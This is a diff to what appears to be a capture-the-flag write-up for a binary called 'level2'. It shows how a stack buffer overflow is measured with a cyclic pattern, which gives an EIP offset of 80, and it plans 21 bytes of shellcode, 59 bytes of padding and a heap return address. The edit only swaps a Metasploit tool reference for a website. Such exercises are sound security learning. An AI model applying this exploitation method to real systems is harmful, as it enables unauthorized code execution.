@@ -34,14 +34,14 @@ strdup("")                                                = 0x0804a008
 # Ok now we need to find the offset of the return address (eip)
 
 # To calculate the offset needed to overwrite the EIP register, we can use a pattern generator tool such as 
-pattern_create.rb and pattern_offset.rb scripts from the Metasploit framework.
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
 > ./level2
 > Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 
-# With pattern_offset.rb, we can figure that the offset is 80
+# We can figure that the offset is 80
 
 # Our shellcode is 21 bytes so we need 59 bytes of padding before our 4 bytes needed for the return address we found (0x0804a008)
 
